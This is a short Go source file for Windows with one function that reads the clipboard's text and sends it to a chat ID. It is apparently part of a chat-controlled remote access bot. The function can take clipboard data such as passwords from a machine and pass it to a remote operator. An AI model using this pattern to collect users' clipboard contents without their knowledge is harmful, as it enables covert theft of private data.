package main

import (
	"syscall"
	"unsafe"
)

func getClipboard(chatID int64) {

	// Will hold the clipboard data
	responseStr := "-"

	// Some temp variables
	var n int = 0
	var data []uint16
	var ptr uintptr
	var h uintptr

	// Open the clipboard
	ret, _, _ := openClipboard.Call(0)
	if ret == 0 {
		responseStr = "Error OpenClipboard()"
		goto close_and_send
	}

	// Get the clipboard data
	h, _, _ = getClipboardData.Call(uintptr(CF_UNICODETEXT))
	if h == 0 {
		responseStr = "Error GetClipboardData()"
		goto close_and_send
	}

	// Lock the handle to get a pointer to the data
	ptr, _, _ = globalLock.Call(h)
	if ptr == 0 {
		goto close_and_send
	}
	defer globalUnlock.Call(h)

	// Create a slice from the pointer
	data = (*[1 << 20]uint16)(unsafe.Pointer(ptr))[:]

	// Find the null terminator
	for i, v := range data {
		if v == 0 {
			n = i
			break
		}
	}

	responseStr = syscall.UTF16ToString(data[:n])

close_and_send:
	closeClipboard.Call()
	SendMessage(chatID, responseStr)

}
